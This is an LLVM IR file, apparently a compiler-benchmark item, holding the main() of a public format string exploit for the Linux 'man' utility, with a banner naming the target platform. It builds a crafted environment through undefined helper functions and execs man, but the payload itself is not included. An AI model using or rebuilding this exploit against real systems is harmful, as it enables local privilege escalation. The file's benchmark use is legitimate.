; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22729.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22729.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [137 x i8] c"(*)man[v1.5l]: format string exploit.\0A(*)by: v9@fakehalo.deadpig.org / fakehalo.\0A\0Asyntax: %s <platform>\0A 0 : Compiled RH/linux 2.4.2-2.\0A\00", align 1
@.str.1 = private unnamed_addr constant [32 x i8] c"main(): invalid platform number\00", align 1
@environ = external dso_local global i8**, align 8
@.str.2 = private unnamed_addr constant [35 x i8] c"main(): allocation of memory error\00", align 1
@PATH = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [30 x i8] c"main(): failed to execute man\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %6 = load i32, i32* %4, align 4
  %7 = icmp slt i32 %6, 2
  br i1 %7, label %8, label %14

8:                                                ; preds = %2
  %9 = load i8**, i8*** %5, align 8
  %10 = getelementptr inbounds i8*, i8** %9, i64 0
  %11 = load i8*, i8** %10, align 8
  %12 = call i32 @printf(i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str, i64 0, i64 0), i8* %11)
  %13 = call i32 @exit(i32 1) #3
  unreachable

14:                                               ; preds = %2
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 1
  %17 = load i8*, i8** %16, align 8
  %18 = call i64 @atoi(i8* %17)
  %19 = icmp sgt i64 %18, 0
  br i1 %19, label %20, label %22

20:                                               ; preds = %14
  %21 = call i32 @printe(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0))
  br label %22

22:                                               ; preds = %20, %14
  %23 = call i32 @bzero(i8* bitcast (i8*** @environ to i8*), i32 8)
  %24 = call i64 @malloc(i32 24)
  %25 = inttoptr i64 %24 to i8**
  store i8** %25, i8*** @environ, align 8
  %26 = icmp ne i8** %25, null
  br i1 %26, label %29, label %27

27:                                               ; preds = %22
  %28 = call i32 @printe(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0))
  br label %29

29:                                               ; preds = %27, %22
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 1
  %32 = load i8*, i8** %31, align 8
  %33 = call i64 @atoi(i8* %32)
  %34 = call i8* @setfmtmem(i64 %33)
  %35 = load i8**, i8*** @environ, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 0
  store i8* %34, i8** %36, align 8
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  %40 = call i64 @atoi(i8* %39)
  %41 = call i8* @setlang(i64 %40)
  %42 = load i8**, i8*** @environ, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 1
  store i8* %41, i8** %43, align 8
  %44 = load i8**, i8*** @environ, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 2
  store i8* null, i8** %45, align 8
  %46 = load i32, i32* @PATH, align 4
  %47 = load i32, i32* @PATH, align 4
  %48 = call i64 @execlp(i32 %46, i32 %47, i32 0)
  %49 = icmp ne i64 %48, 0
  br i1 %49, label %50, label %52

50:                                               ; preds = %29
  %51 = call i32 @printe(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0))
  br label %52

52:                                               ; preds = %50, %29
  %53 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @atoi(i8*) #1

declare dso_local i32 @printe(i8*) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i8* @setfmtmem(i64) #1

declare dso_local i8* @setlang(i64) #1

declare dso_local i64 @execlp(i32, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
